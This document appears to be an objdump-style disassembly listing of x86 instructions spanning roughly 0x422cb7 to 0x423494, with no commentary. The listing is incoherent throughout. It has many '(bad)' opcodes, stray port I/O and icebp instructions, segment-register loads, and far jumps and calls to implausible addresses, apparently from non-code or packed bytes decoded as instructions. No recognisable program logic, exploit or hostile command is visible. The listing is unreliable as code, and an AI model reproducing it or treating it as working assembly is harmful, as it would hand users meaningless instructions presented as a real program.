  422cb7:	es jl  0x422d1a
  422cba:	cdq    
  422cbb:	sbb    ch,bh
  422cbd:	(bad)  
  422cbe:	pop    ds
  422cbf:	xchg   esi,eax
  422cc0:	imul   edx,DWORD PTR ds:0x7b41e3ae,0xbd7a2cd2
  422cca:	pop    edx
  422ccb:	ja     0x422ccb
  422ccd:	jmp    0x422caf
  422ccf:	cmc    
  422cd0:	pop    ds
  422cd1:	mov    edi,0x8ea8c4b9
  422cd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cd7:	sbb    BYTE PTR [esi+0x3cc313a7],dl
  422cdd:	dec    esp
  422cde:	mov    ch,BYTE PTR [ebx+0x34]
  422ce1:	fs icebp 
  422ce3:	jl     0x422cc2
  422ce5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ce6:	push   0xffffffe5
  422ce8:	push   esp
  422ce9:	mov    cl,0x79
  422ceb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cec:	test   BYTE PTR [ebp-0x5c],al
  422cef:	sub    BYTE PTR gs:[ecx+0x39ebbc98],0x88
  422cf7:	out    0x31,al
  422cf9:	rcl    BYTE PTR [esi-0x4f9d77d5],cl
  422cff:	js     0x422d78
  422d01:	cmp    cl,0xd9
  422d04:	gs (bad) 
  422d06:	mov    ecx,0xd055c7ff
  422d0b:	fcmovbe st,st(0)
  422d0d:	pop    ds
  422d0e:	push   eax
  422d0f:	mov    ah,bl
  422d11:	dec    edi
  422d12:	mov    edi,0xc97ca1bb
  422d17:	in     eax,0x6f
  422d19:	mov    ss,ebp
  422d1b:	and    eax,esp
  422d1d:	test   al,0xbc
  422d1f:	std    
  422d20:	adc    BYTE PTR [edx],dh
  422d22:	es xor ebp,esi
  422d25:	xor    esp,eax
  422d27:	pop    esp
  422d28:	lds    ecx,FWORD PTR [eax-0xd969533]
  422d2e:	add    al,0x8d
  422d30:	loopne 0x422d4f
  422d32:	fidivr WORD PTR [eax]
  422d34:	jge    0x422d17
  422d36:	dec    edx
  422d37:	xlat   BYTE PTR ds:[ebx]
  422d38:	adc    al,0x87
  422d3a:	mov    al,0x52
  422d3c:	mov    esi,0x9bac1ba7
  422d41:	xor    DWORD PTR [edi],0x57
  422d44:	test   BYTE PTR [esi+0x18],bl
  422d47:	stc    
  422d48:	jae    0x422ce0
  422d4a:	add    eax,DWORD PTR [edx-0x2c5fb8b6]
  422d50:	xchg   ebp,eax
  422d51:	in     al,dx
  422d52:	inc    edx
  422d53:	shl    DWORD PTR [esp+ebx*2-0x47],1
  422d57:	retf   0xe80f
  422d5a:	sbb    esi,DWORD PTR [ecx-0x3df8c15a]
  422d60:	shl    dh,1
  422d62:	out    0xd3,al
  422d64:	sbb    al,BYTE PTR [edi]
  422d66:	xchg   ebx,eax
  422d67:	dec    ecx
  422d68:	and    bl,bl
  422d6a:	push   eax
  422d6b:	iret   
  422d6c:	xor    ebp,DWORD PTR [ebx-0x1ef74f39]
  422d72:	sbb    al,0x27
  422d74:	pop    es
  422d75:	and    eax,0x22beb3e4
  422d7a:	sbb    DWORD PTR [edi],0xfe605d6f
  422d80:	or     al,BYTE PTR [eax+0x367e537c]
  422d86:	jecxz  0x422dbf
  422d88:	push   eax
  422d89:	loop   0x422d3c
  422d8b:	jns    0x422df9
  422d8d:	out    0xbd,eax
  422d8f:	jmp    0x45bbc907
  422d94:	add    dh,BYTE PTR [esi+0x29]
  422d97:	das    
  422d98:	push   esp
  422d99:	cdq    
  422d9a:	inc    esi
  422d9b:	iret   
  422d9c:	stc    
  422d9d:	call   0xe147e105
  422da2:	pop    eax
  422da3:	sub    al,0xf3
  422da5:	stos   DWORD PTR es:[edi],eax
  422da6:	lds    ecx,FWORD PTR [ecx-0x2]
  422da9:	jl     0x422d31
  422dab:	add    ebx,edi
  422dad:	jecxz  0x422e01
  422daf:	jne    0x422d5a
  422db1:	inc    ecx
  422db2:	inc    dx
  422db4:	push   eax
  422db5:	inc    esi
  422db6:	and    BYTE PTR [esi+edx*8-0x759c86d5],ch
  422dbd:	ins    BYTE PTR es:[edi],dx
  422dbe:	pop    eax
  422dbf:	(bad)  
  422dc0:	in     al,dx
  422dc1:	mov    eax,edx
  422dc3:	xor    bh,BYTE PTR [ebx]
  422dc5:	out    0x50,eax
  422dc7:	lds    ebx,FWORD PTR [ebx-0x77ad233c]
  422dcd:	loop   0x422d6e
  422dcf:	inc    esp
  422dd0:	push   edx
  422dd1:	imul   eax,DWORD PTR [edx+eiz*4+0x78bb857d],0xb3c58ae1
  422ddc:	pop    esi
  422ddd:	fild   QWORD PTR [esi-0x491b49f4]
  422de3:	jecxz  0x422d6c
  422de5:	addr16 int3 
  422de7:	dec    edi
  422de8:	scas   eax,DWORD PTR es:[edi]
  422de9:	test   DWORD PTR [ebx-0x5ae1134b],ebp
  422def:	arpl   WORD PTR [edx-0x1dedcfb5],si
  422df5:	test   BYTE PTR ds:0x20f25f32,bh
  422dfb:	test   DWORD PTR [esi],0x773ebb82
  422e01:	add    BYTE PTR [edi],cl
  422e03:	sub    edx,DWORD PTR [ecx+0x2a6de237]
  422e09:	cwde   
  422e0a:	ss icebp 
  422e0c:	mov    al,0x8a
  422e0e:	ins    BYTE PTR es:[edi],dx
  422e0f:	test   eax,eax
  422e11:	stos   DWORD PTR es:[edi],eax
  422e12:	test   eax,0xe54120b2
  422e17:	add    eax,0xf04c1433
  422e1c:	pusha  
  422e1d:	or     al,0xb0
  422e1f:	mov    es,WORD PTR [eax-0x57]
  422e22:	sub    edi,ebx
  422e24:	stos   DWORD PTR es:[edi],eax
  422e25:	adc    al,0x2
  422e27:	add    al,bh
  422e29:	nop
  422e2a:	inc    edi
  422e2b:	push   edx
  422e2c:	(bad)  
  422e2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e2e:	mov    bl,0xe9
  422e30:	mov    eax,0xf3752569
  422e35:	cld    
  422e36:	push   ecx
  422e37:	cdq    
  422e38:	arpl   WORD PTR [edx],di
  422e3a:	daa    
  422e3b:	or     edi,DWORD PTR [ebx-0x25f54104]
  422e41:	ins    BYTE PTR es:[edi],dx
  422e42:	dec    ebp
  422e43:	cli    
  422e44:	or     eax,0xd25e372e
  422e49:	xor    edi,edx
  422e4b:	je     0x422e08
	...
  422e59:	add    cl,bh
  422e5b:	std    
  422e5c:	in     eax,dx
  422e5d:	mov    cl,0xed
  422e5f:	mov    cl,0xfd
  422e61:	std    
  422e62:	cmp    bl,BYTE PTR [edi+0x7c96fec4]
  422e68:	mov    ah,0x6f
  422e6a:	test   eax,0xfb0001a8
  422e6f:	add    DWORD PTR [eax],eax
  422e71:	add    dl,ah
  422e73:	enter  0x54a3,0xd7
  422e77:	add    BYTE PTR [ecx+0x7c9d2605],al
  422e7d:	cdq    
  422e7e:	aad    0x79
  422e80:	call   0xa0cd:0x2feec5ef
  422e87:	loopne 0x422ed2
  422e89:	fs pop edx
  422e8b:	sbb    eax,0xca6bd8b3
  422e90:	stc    
  422e91:	push   edx
  422e92:	jno    0x422ea1
  422e94:	ror    DWORD PTR [ecx],cl
  422e96:	dec    eax
  422e97:	fst    DWORD PTR [ebx+0x710fd86a]
  422e9d:	ror    DWORD PTR [edi],cl
  422e9f:	pop    ecx
  422ea0:	sub    bl,dl
  422ea2:	enter  0xb5ca,0x29
  422ea6:	clc    
  422ea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ea8:	or     DWORD PTR ds:0x5f65c50c,ecx
  422eae:	xchg   edx,eax
  422eaf:	sbb    esi,DWORD PTR [ecx+edi*1]
  422eb2:	aaa    
  422eb3:	jb     0x422f1b
  422eb5:	mov    es,WORD PTR [ecx+0xa]
  422eb8:	retf   
  422eb9:	mov    eax,0x9d68b6d7
  422ebe:	adc    BYTE PTR [edi-0x73],0x95
  422ec2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ec3:	jecxz  0x422f36
  422ec5:	icebp  
  422ec6:	je     0x422f1a
  422ec8:	sub    DWORD PTR [edi+0x38],ebx
  422ecb:	push   eax
  422ecc:	push   es
  422ecd:	jecxz  0x422e54
  422ecf:	sub    BYTE PTR [edx-0x4d009937],cl
  422ed5:	and    al,0xf2
  422ed7:	in     al,dx
  422ed8:	fstp   st(5)
  422eda:	bound  esp,QWORD PTR [ebp+0x69]
  422edd:	or     edi,ecx
  422edf:	out    dx,al
  422ee0:	call   0xe0df:0x12e58c62
  422ee7:	dec    esi
  422ee8:	jns    0x422ee6
  422eea:	dec    edx
  422eeb:	xchg   edx,eax
  422eec:	div    ebx
  422eee:	jl     0x422f03
  422ef0:	in     eax,0x2f
  422ef2:	push   cs
  422ef3:	inc    eax
  422ef4:	gs and al,0x2
  422ef7:	and    DWORD PTR [eax+0x55],0x405be61
  422efe:	sbb    DWORD PTR [edi],edx
  422f00:	cmp    eax,0xb35cf74b
  422f05:	(bad)  
  422f06:	mov    ds:0xf1108fdf,eax
  422f0b:	in     al,0x18
  422f0d:	jle    0x422efe
  422f0f:	inc    esi
  422f10:	retf   0x1f13
  422f13:	icebp  
  422f14:	(bad)  
  422f15:	mov    al,0xfb
  422f17:	jge    0x422efb
  422f19:	dec    esi
  422f1a:	pop    eax
  422f1b:	cmp    al,0x5d
  422f1d:	cs scas eax,DWORD PTR es:[edi]
  422f1f:	jl     0x422efe
  422f21:	fcom   QWORD PTR [eax]
  422f23:	mov    DWORD PTR [esp+esi*4-0x65],ebp
  422f27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f28:	icebp  
  422f29:	cli    
  422f2a:	pop    esi
  422f2b:	or     al,0xab
  422f2d:	leave  
  422f2e:	mov    WORD PTR [esi-0x34c916cd],es
  422f34:	xor    esp,DWORD PTR [edx-0x6f]
  422f37:	jo     0x422ef5
  422f39:	add    ebx,DWORD PTR ds:0xaee6ea73
  422f3f:	movntq QWORD PTR [ebp+0x61],mm4
  422f43:	mov    edx,0x7cda7fc8
  422f48:	cs aas 
  422f4a:	xchg   ah,bh
  422f4c:	aas    
  422f4d:	fstp   QWORD PTR [eax-0x21]
  422f50:	jno    0x422f3f
  422f52:	stc    
  422f53:	sub    dh,al
  422f55:	mov    cl,0xf3
  422f57:	push   ebp
  422f58:	fs inc eax
  422f5a:	push   edx
  422f5b:	inc    esi
  422f5c:	jnp    0x422f3a
  422f5e:	scas   al,BYTE PTR es:[edi]
  422f5f:	sub    eax,0x384e0b5
  422f64:	lea    esp,[ebp+0x1c]
  422f67:	xchg   esp,eax
  422f68:	rcl    dh,1
  422f6a:	jne    0x422f89
  422f6c:	push   DWORD PTR ds:0x410741c2
  422f72:	dec    edx
  422f73:	dec    ecx
  422f74:	mov    ds:0xe64ad6c1,eax
  422f79:	hlt    
  422f7a:	(bad)
  422f7f:	adc    BYTE PTR [eax-0x380b85b4],bh
  422f85:	jmp    0xf3df:0x683f4b65
  422f8c:	das    
  422f8d:	mov    ds,WORD PTR ss:[esp+edi*4-0x4d9d2fda]
  422f95:	dec    esi
  422f96:	nop
  422f97:	std    
  422f98:	(bad)  
  422f99:	out    0xdf,al
  422f9b:	cmp    DWORD PTR [eax],ebx
  422f9d:	mov    ds:0x80cf4b9c,al
  422fa2:	jmp    0x68bd:0xb623671d
  422fa9:	fnstcw WORD PTR [edx+esi*1+0x549bd785]
  422fb0:	xchg   esp,eax
  422fb1:	aaa    
  422fb2:	add    BYTE PTR [ebp+0x12d6d623],cl
  422fb8:	stos   BYTE PTR es:[edi],al
  422fb9:	push   cs
  422fba:	mov    al,ds:0x27925
  422fbf:	test   BYTE PTR [ecx-0x1ee503aa],al
  422fc5:	xor    al,0xec
  422fc7:	sbb    eax,DWORD PTR [ecx+esi*1-0x44]
  422fcb:	xchg   ebp,eax
  422fcc:	xchg   edx,eax
  422fcd:	fs or  edi,esi
  422fd0:	stos   DWORD PTR es:[edi],eax
  422fd1:	sub    eax,0x3394b76d
  422fd6:	sub    eax,0x84f8e222
  422fdb:	daa    
  422fdc:	xchg   esp,eax
  422fdd:	sub    dl,al
  422fdf:	sub    dl,cl
  422fe1:	cmp    esi,edx
  422fe3:	mov    al,0xda
  422fe5:	call   0x6627fa15
  422fea:	das    
  422feb:	mov    ds:0x1582df46,al
  422ff0:	cwde   
  422ff1:	cmp    al,BYTE PTR [edi-0x4d]
  422ff4:	in     eax,dx
  422ff5:	fs clc 
  422ff7:	xor    edx,ebx
  422ff9:	fsub   DWORD PTR ds:0x419fecc8
  422fff:	mov    DWORD PTR [edi+ecx*8-0x641f9c37],0xe5e9110e
  42300a:	out    0x5b,eax
  42300c:	and    DWORD PTR [ebp-0x53],edi
  42300f:	xchg   ebp,eax
  423010:	jno    0x422fe2
  423012:	scas   al,BYTE PTR es:[edi]
  423013:	pop    ecx
  423014:	(bad)  
  423016:	in     eax,0x2f
  423018:	pop    edx
  423019:	mov    ch,0x7c
  42301b:	jecxz  0x423001
  42301d:	daa    
  42301e:	fcomp  DWORD PTR [ecx]
  423020:	xchg   esi,eax
  423021:	jbe    0x42302c
  423023:	jnp    0x422ff7
  423025:	mov    edx,0x32be073c
  42302a:	pop    edi
  42302b:	shl    edx,cl
  42302d:	jb     0x422fb4
  42302f:	mov    ecx,0xf7da3e5f
  423034:	mov    al,0xd1
  423036:	jmp    0xc052604c
  42303b:	xor    BYTE PTR [edi+edi*2-0x40],al
  42303f:	inc    esi
  423040:	dec    ebx
  423041:	test   al,0x67
  423043:	sbb    BYTE PTR [eax+edx*4+0x4ad5989b],dl
  42304a:	call   0x24c2fe5d
  42304f:	(bad)  
  423050:	dec    esi
  423051:	jmp    FWORD PTR [ebx+0x6fb612f1]
  423057:	jmp    0x1a2c1841
  42305c:	inc    esi
  42305d:	cmc    
  42305e:	pop    es
  42305f:	fistp  WORD PTR [ebx+0x7b]
  423062:	lock sbb ah,dh
  423065:	loopne 0x4230d8
  423067:	leave  
  423068:	adc    BYTE PTR [ecx+0x1089df],dh
	...
  42307a:	repnz rol BYTE PTR ds:0xf6d53751,0xe3
  423082:	test   BYTE PTR [eax],0xec
  423085:	inc    esi
  423086:	pop    esp
  423087:	mov    al,0xfa
  423089:	sahf   
  42308a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42308b:	stos   BYTE PTR es:[edi],al
  42308c:	add    DWORD PTR [eax],eax
  42308e:	sti    
  42308f:	add    DWORD PTR [eax],eax
  423091:	add    BYTE PTR [ebp+0x1132bc51],bl
  423097:	std    
  423098:	mov    bh,BYTE PTR [ecx+0x9f83570]
  42309e:	inc    edi
  42309f:	jmp    0x42306b
  4230a1:	ins    BYTE PTR es:[edi],dx
  4230a2:	dec    edi
  4230a3:	xor    DWORD PTR [edx-0x34],0x11
  4230a7:	out    0xa8,al
  4230a9:	test   BYTE PTR [edi+0x44bc2b52],ah
  4230af:	lods   al,BYTE PTR ds:[esi]
  4230b0:	push   edx
  4230b1:	cmp    edx,DWORD PTR [esi+0x6]
  4230b4:	std    
  4230b5:	sti    
  4230b6:	mov    ecx,0xa5ebe8c1
  4230bb:	shl    BYTE PTR [ebp-0x52866c2f],0xdf
  4230c2:	imul   ebp,DWORD PTR [esp+edx*8],0xffffffe0
  4230c6:	ror    DWORD PTR [edx],1
  4230c8:	sub    eax,0xbbb0063e
  4230cd:	pop    ds
  4230ce:	push   cs
  4230cf:	mov    ?,WORD PTR es:0x579b6466
  4230d6:	xchg   esp,eax
  4230d7:	mov    BYTE PTR [ebx-0x1],ah
  4230da:	mov    bh,0x3
  4230dc:	mov    al,ds:0x4847d4a0
  4230e1:	pop    esi
  4230e2:	cmp    ah,BYTE PTR ds:0x2d3633fe
  4230e8:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4230ea:	out    dx,al
  4230eb:	sub    esi,DWORD PTR [edx-0x5a]
  4230ee:	xor    DWORD PTR [ecx],0xffffff8f
  4230f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230f2:	imul   edi,DWORD PTR [ebx+0x3c433c34],0x8
  4230f9:	mov    edi,DWORD PTR [edx+0x34]
  4230fc:	inc    edi
  4230fd:	mov    bh,0x2c
  4230ff:	inc    ebx
  423100:	pop    edi
  423101:	and    al,0x12
  423103:	in     al,0x10
  423105:	jecxz  0x42314c
  423107:	and    BYTE PTR [ebx+0xc38bd64],dh
  42310d:	retf   0x5297
  423110:	aad    0x12
  423112:	pop    ss
  423113:	xor    eax,0x1d79306a
  423118:	adc    al,al
  42311a:	sub    eax,0xc5a3474c
  42311f:	xchg   ecx,eax
  423120:	xor    DWORD PTR [ebp+0x7076a5d7],eax
  423126:	jg     0x423195
  423128:	test   BYTE PTR [edx-0x72],0x6
  42312c:	lods   al,BYTE PTR ds:[esi]
  42312d:	(bad)  
  42312e:	popf   
  42312f:	cmp    ch,BYTE PTR [edi+0x66]
  423132:	cli    
  423133:	inc    eax
  423134:	add    BYTE PTR [ebp-0x4e],cl
  423137:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423138:	lods   al,BYTE PTR ds:[esi]
  423139:	or     edx,DWORD PTR es:0x7ccca503
  423140:	sub    eax,0xe28de064
  423145:	pop    ebp
  423146:	mov    edx,ecx
  423148:	hlt    
  423149:	cmp    esi,ecx
  42314b:	and    edx,DWORD PTR [edi]
  42314d:	cmp    eax,0x899ee345
  423152:	lods   eax,DWORD PTR ds:[esi]
  423153:	xchg   edi,eax
  423154:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423155:	add    eax,DWORD PTR [ebx+0x6dc6120d]
  42315b:	jae    0x423110
  42315d:	out    0x19,eax
  42315f:	daa    
  423160:	mov    DWORD PTR [esi],edx
  423162:	mov    al,ds:0xba5038ab
  423167:	ficomp DWORD PTR [ebp+esi*4-0x434f1970]
  42316e:	std    
  42316f:	jp     0x4231a2
  423171:	rol    BYTE PTR [ebx-0x229d712c],cl
  423177:	or     al,0x64
  423179:	test   BYTE PTR [edx-0x7e4c37f5],dl
  42317f:	jbe    0x4231ea
  423181:	add    dl,BYTE PTR [edi-0x46bf83c9]
  423187:	mov    ch,0x3e
  423189:	xchg   edx,eax
  42318a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42318b:	repnz test eax,0xda8734e7
  423191:	mov    bh,0xa1
  423193:	lds    edi,FWORD PTR [esp+eiz*2+0x42]
  423197:	jb     0x4231bb
  423199:	mov    bl,0xb1
  42319b:	shl    BYTE PTR [eax-0x3083759d],1
  4231a1:	mov    cl,0x7f
  4231a3:	mov    ebp,0x76773d9b
  4231a8:	retf   0x103
  4231ab:	mov    ah,BYTE PTR [edx-0x197e9da8]
  4231b1:	mov    al,0xd3
  4231b3:	stos   BYTE PTR es:[edi],al
  4231b4:	lods   al,BYTE PTR ds:[esi]
  4231b5:	jbe    0x42316d
  4231b7:	push   edx
  4231b8:	in     al,0xc0
  4231ba:	dec    edi
  4231bb:	gs lahf 
  4231bd:	cdq    
  4231be:	mov    edx,0x3d86c4f4
  4231c3:	inc    ecx
  4231c4:	out    dx,al
  4231c5:	clc    
  4231c6:	in     al,dx
  4231c7:	and    DWORD PTR [edi-0x19d3a62b],edi
  4231cd:	int3   
  4231ce:	mul    DWORD PTR [ecx]
  4231d0:	mov    dh,0xa0
  4231d2:	mov    bh,0x9b
  4231d4:	xor    BYTE PTR [edi],ch
  4231d6:	adc    al,0x33
  4231d8:	xchg   esp,eax
  4231d9:	iret   
  4231da:	mov    esi,0x70dc126e
  4231df:	scas   al,BYTE PTR es:[edi]
  4231e0:	xor    edi,esp
  4231e2:	sub    DWORD PTR [ebp+0x73448c25],ebp
  4231e8:	push   0x20
  4231ea:	ffree  st(7)
  4231ec:	mov    ch,0x51
  4231ee:	cmp    ecx,DWORD PTR [eax-0x1]
  4231f1:	push   edx
  4231f2:	adc    BYTE PTR [esi],cl
  4231f4:	ret    
  4231f5:	nop
  4231f6:	push   eax
  4231f7:	(bad)  
  4231f8:	icebp  
  4231f9:	mov    ss,WORD PTR [ecx-0xa47cada]
  4231ff:	sahf   
  423200:	stc    
  423201:	sbb    al,0x9a
  423203:	iret   
  423204:	mov    al,0x47
  423206:	fdiv   DWORD PTR [eax-0x5a]
  423209:	pop    ecx
  42320a:	out    dx,eax
  42320b:	dec    edx
  42320c:	sbb    al,0xcd
  42320e:	jge    0x423207
  423210:	sbb    BYTE PTR [ecx-0x1b],al
  423213:	push   eax
  423214:	xchg   esp,eax
  423215:	ss adc al,0x20
  423218:	sahf   
  423219:	sar    BYTE PTR [ecx],1
  42321b:	das    
  42321c:	gs std 
  42321e:	ins    DWORD PTR es:[edi],dx
  42321f:	fld    TBYTE PTR [ebp-0x76c56565]
  423225:	inc    ebp
  423226:	or     ah,BYTE PTR [ebx+0x1763679b]
  42322c:	sbb    BYTE PTR [edx+eax*2+0x7f],ch
  423230:	icebp  
  423231:	xchg   edx,eax
  423232:	sbb    eax,0x1d6fdb00
  423237:	jb     0x423256
  423239:	fnstsw WORD PTR [ebx-0x9]
  42323c:	repz lea esp,[edx-0x4ea9a2a2]
  423243:	hlt    
  423244:	pop    esi
  423245:	add    eax,DWORD PTR ds:0x219ef6c3
  42324b:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  42324d:	shl    BYTE PTR [ebp+eax*1-0x2e9beade],cl
  423254:	leave  
  423255:	dec    edx
  423256:	cs push edi
  423258:	cmp    DWORD PTR [edi-0x48bc7a7d],esi
  42325e:	adc    dl,dl
  423260:	mov    esp,0x736c2abc
  423265:	inc    esi
  423266:	pop    esp
  423267:	cs es out dx,al
  42326a:	sar    ch,1
  42326c:	repz inc ebx
  42326e:	imul   DWORD PTR [ebx-0x57d09faf]
  423274:	add    BYTE PTR [edx],dl
  423276:	sahf   
  423277:	lock js 0x423213
  42327a:	js     0x423240
  42327c:	add    ebp,esi
  42327e:	mov    bh,0x35
  423280:	idiv   esi
  423282:	cmp    eax,0xf11d622b
  423287:	xchg   ebp,eax
  423288:	call   0x0:0x775ce2ff
	...
  423297:	add    BYTE PTR [eax],al
  423299:	add    BYTE PTR [ebx+0x41],al
  42329c:	popa   
  42329d:	data16 arpl WORD PTR [esi+0x47],sp
  4232a1:	gs push cs
  4232a3:	mov    BYTE PTR [edi-0x37],bh
  4232a6:	scas   eax,DWORD PTR es:[edi]
  4232a7:	jnp    0x423260
  4232a9:	cmp    DWORD PTR [edi-0x4fffe54],ebx
  4232af:	add    DWORD PTR [eax],eax
  4232b1:	add    bh,al
  4232b3:	mov    bl,0x24
  4232b5:	mov    eax,ds:0xb37e708e
  4232ba:	stos   DWORD PTR es:[edi],eax
  4232bb:	(bad)  
  4232bc:	fwait
  4232bd:	enter  0x23a4,0xeb
  4232c1:	xor    ax,0xa3e2
  4232c5:	ret    0xdd19
  4232c8:	xlat   BYTE PTR ds:[ebx]
  4232c9:	lds    edx,FWORD PTR [esi+0x7f]
  4232cc:	mov    DWORD PTR [ecx-0x77e8820e],0xe01eca3d
  4232d6:	in     eax,0xb9
  4232d8:	xchg   ebp,eax
  4232d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232da:	into   
  4232db:	pusha  
  4232dc:	add    ebp,eax
  4232de:	jle    0x4232bf
  4232e0:	and    DWORD PTR [edx+0x8d8e52c],ecx
  4232e6:	cmovg  ebx,DWORD PTR [ebx]
  4232e9:	ins    DWORD PTR es:[edi],dx
  4232ea:	out    dx,al
  4232eb:	sbb    dl,0x75
  4232ee:	mov    DWORD PTR [ecx],eax
  4232f0:	ins    DWORD PTR es:[edi],dx
  4232f1:	fwait
  4232f2:	ss push ecx
  4232f4:	adc    ebx,DWORD PTR [ebp+0xc]
  4232f7:	aas    
  4232f8:	mov    bh,0xd0
  4232fa:	lahf   
  4232fb:	shl    BYTE PTR es:[ebx-0xb],cl
  4232ff:	xchg   ebx,eax
  423300:	dec    ebx
  423301:	and    BYTE PTR [edx],ah
  423303:	cmp    BYTE PTR [edx+0x1e6858c2],al
  423309:	outs   dx,BYTE PTR ds:[esi]
  42330a:	in     al,dx
  42330b:	xchg   BYTE PTR [ebx-0x6f8e7d36],bl
  423311:	sti    
  423312:	nop
  423313:	adc    ecx,edx
  423315:	inc    eax
  423316:	push   esp
  423317:	nop
  423318:	mov    ebp,0xcb5d264b
  42331d:	sbb    al,0xf
  42331f:	das    
  423320:	fstp   DWORD PTR [edx+0x76b1eddf]
  423326:	jg     0x4232d7
  423328:	inc    ecx
  423329:	stc    
  42332a:	mov    ch,0x46
  42332c:	and    eax,0xa498816f
  423331:	cmp    al,0xde
  423333:	jge    0x4233a5
  423335:	xor    eax,0x321e3ffd
  42333a:	dec    edx
  42333b:	jle    0x4232fa
  42333d:	mov    dh,0x9f
  42333f:	aas    
  423340:	in     al,dx
  423341:	pop    esp
  423342:	jge    0x423366
  423344:	into   
  423345:	aaa    
  423346:	loopne 0x4232ca
  423348:	xor    al,0xd4
  42334a:	ret    
  42334b:	and    DWORD PTR [edi-0xc],eax
  42334e:	das    
  42334f:	jmp    0x1c1d:0x1ce04e42
  423356:	sub    al,0xba
  423358:	mov    ecx,eax
  42335a:	ins    DWORD PTR es:[edi],dx
  42335b:	mov    fs,WORD PTR [ebx+0x65]
  42335e:	sbb    cl,BYTE PTR [ebp-0x2a3ff65e]
  423364:	xlat   BYTE PTR ds:[ebx]
  423365:	and    ah,BYTE PTR [ebp+0x4d]
  423368:	imul   DWORD PTR [esi+ebx*2]
  42336b:	xchg   edx,eax
  42336c:	dec    eax
  42336d:	push   ss
  42336e:	cmp    al,0x32
  423370:	imul   eax,ebp,0xd79956fc
  423376:	sbb    al,BYTE PTR [ecx-0xcffcabe]
  42337c:	lods   eax,DWORD PTR ds:[esi]
  42337d:	inc    esp
  42337e:	mov    ebp,0xd72eaae1
  423383:	(bad)  
  423384:	aam    0x6a
  423386:	ret    
  423387:	repnz and DWORD PTR [edx],edx
  42338a:	sub    BYTE PTR [eax],cl
  42338c:	repz mov ecx,0x4c1dc628
  423392:	xchg   ebp,edx
  423394:	mov    ebx,0x1d36505e
  423399:	xchg   esi,eax
  42339a:	add    BYTE PTR [ebx-0x70],ch
  42339d:	pop    edx
  42339e:	(bad)  
  42339f:	ja     0x423391
  4233a1:	(bad)  
  4233a2:	fimul  WORD PTR [edi]
  4233a4:	mov    edx,0x517b1555
  4233a9:	and    al,0x5e
  4233ab:	std    
  4233ac:	int    0xfa
  4233ae:	xor    bl,al
  4233b0:	fwait
  4233b1:	repnz rol DWORD PTR [ecx+0x15d42fd8],1
  4233b8:	cld    
  4233b9:	scas   eax,DWORD PTR es:[edi]
  4233ba:	sub    al,0xa5
  4233bc:	mov    ds:0xf65f9f48,al
  4233c1:	sub    eax,0x7eb83483
  4233c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233c7:	fadd   QWORD PTR [eax]
  4233c9:	ins    BYTE PTR es:[edi],dx
  4233ca:	enter  0x1c03,0x83
  4233ce:	add    BYTE PTR [esi+edx*4],al
  4233d1:	mov    dh,0x17
  4233d3:	icebp  
  4233d4:	mov    esp,0x61fda5ee
  4233d9:	push   edx
  4233da:	mov    eax,ds:0xe1f3a074
  4233df:	test   eax,0xedd3a812
  4233e4:	nop
  4233e5:	xchg   DWORD PTR [esp+edx*8+0x1c],edi
  4233e9:	push   eax
  4233ea:	(bad)  
  4233eb:	lods   al,BYTE PTR ds:[esi]
  4233ec:	jp     0x42343d
  4233ee:	dec    esp
  4233ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233f0:	adc    al,BYTE PTR ds:0x1cdfc33
  4233f6:	retf   
  4233f7:	jmp    0x55ed44c6
  4233fc:	dec    eax
  4233fd:	lods   al,BYTE PTR ds:[esi]
  4233fe:	mov    esp,0xcd638229
  423403:	out    0x67,al
  423405:	ins    BYTE PTR es:[edi],dx
  423406:	leave  
  423407:	std    
  423408:	push   ss
  423409:	or     bl,BYTE PTR [edx-0x59]
  42340c:	cld    
  42340d:	dec    edx
  42340e:	in     al,0x69
  423410:	mov    eax,0x2d87e308
  423415:	xchg   BYTE PTR gs:[esi+eiz*2+0x44],al
  42341a:	daa    
  42341b:	and    ebp,DWORD PTR [ebp+0x72084484]
  423421:	or     al,0x24
  423423:	add    al,0xa6
  423425:	cwde   
  423426:	pop    edx
  423427:	mov    WORD PTR [edi-0xa],ss
  42342a:	sub    bl,al
  42342c:	ficomp DWORD PTR [esi-0x40]
  42342f:	loope  0x4233f6
  423431:	push   esp
  423432:	stos   DWORD PTR es:[edi],eax
  423433:	int    0xd4
  423435:	dec    ebp
  423436:	mov    ?,WORD PTR [edx-0x79]
  423439:	cmp    al,bl
  42343b:	and    ebp,edx
  42343d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42343e:	and    DWORD PTR [esi+0x1960a572],esi
  423444:	or     eax,0x1074091b
  423449:	mov    BYTE PTR [ebp+esi*4-0x64f49c75],dh
  423450:	mov    cl,BYTE PTR [ebp-0x60]
  423453:	std    
  423454:	cdq    
  423455:	frstpm(287 only) 
  423457:	pop    esp
  423458:	mov    cl,0xd
  42345a:	mov    eax,ds:0xae3fb9bd
  42345f:	jne    0x4234e0
  423461:	repz (bad) 
  423463:	imul   esi,DWORD PTR [ebx+esi*8-0x42],0xa827353e
  42346b:	(bad)
  42346f:	pusha  
  423470:	push   esi
  423471:	xor    al,0xdd
  423473:	adc    al,0x4a
  423475:	jo     0x4234ae
  423477:	adc    eax,0x8ee141b4
  42347c:	pop    esp
  42347d:	pop    edx
  42347e:	adc    al,0xee
  423480:	mov    esp,0xe5c2168d
  423485:	dec    edi
  423486:	cmp    dl,BYTE PTR [esi+0x35]
  423489:	retf   
  42348a:	mov    al,ds:0xee662e83
  42348f:	adc    eax,0x2992b02a
  423494:	jg     0x423439
